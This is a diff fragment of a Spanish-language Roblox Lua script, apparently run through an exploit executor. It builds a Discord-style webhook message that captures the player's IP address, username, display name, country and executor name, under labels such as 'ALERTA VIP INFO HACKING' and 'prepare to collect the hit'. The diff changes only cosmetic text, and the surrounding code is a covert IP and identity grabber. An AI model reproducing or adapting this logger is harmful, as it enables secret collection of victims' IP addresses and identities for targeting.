@@ -128,16 +128,16 @@ local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId="..Loc
 local executorName = identifyexecutor and identifyexecutor() or "Desconocido"
 
 local data = {
-    ["username"] = "⚠️ ALERTA VIP",
+    ["username"] = "⚠️ ALERTA VIP INFO HACKING",
     ["avatar_url"] = avatarUrl,
     ["content"] = "**⚠️ Ejecución detectada, prepárate para recoger el hit 🚨**",
     ["embeds"] = {{
         ["title"] = "🎮 Alerta de ejecución",
-        ["description"] = "Información capturada automáticamente con portada en la esquina:",
+        ["description"] = "Información capturada automáticamente con el mejor sistema hacking:",
         ["color"] = 16729344,
         ["thumbnail"] = {["url"] = mainImageURL},
         ["fields"] = {
-            {["name"]="IP☠️:", ["value"]=userIP, ["inline"]=true},
+            {["name"]="IP📡:", ["value"]=userIP, ["inline"]=true},
             {["name"]="👤 Usuario", ["value"]=LocalPlayer.Name, ["inline"]=true},
             {["name"]="✨ DisplayName", ["value"]=LocalPlayer.DisplayName, ["inline"]=true},
             {["name"]="🌎 País", ["value"]=countryDisplay, ["inline"]=true},
@@ -145,7 +145,7 @@ local data = {
             {["name"]="⏰ Hora", ["value"]=os.date("%Y-%m-%d %H:%M:%S"), ["inline"]=false},
             {["name"]="💥 Estado", ["value"]="Preparando todo para el hit, mantente atento!", ["inline"]=false}
         },
-        ["footer"] = {["text"] = "Sistema de ejecución • " .. os.date("%d/%m/%Y")}
+        ["footer"] = {["text"] = "Sistema de ejecución hacking • " .. os.date("%d/%m/%Y")}
     }}
 }
 
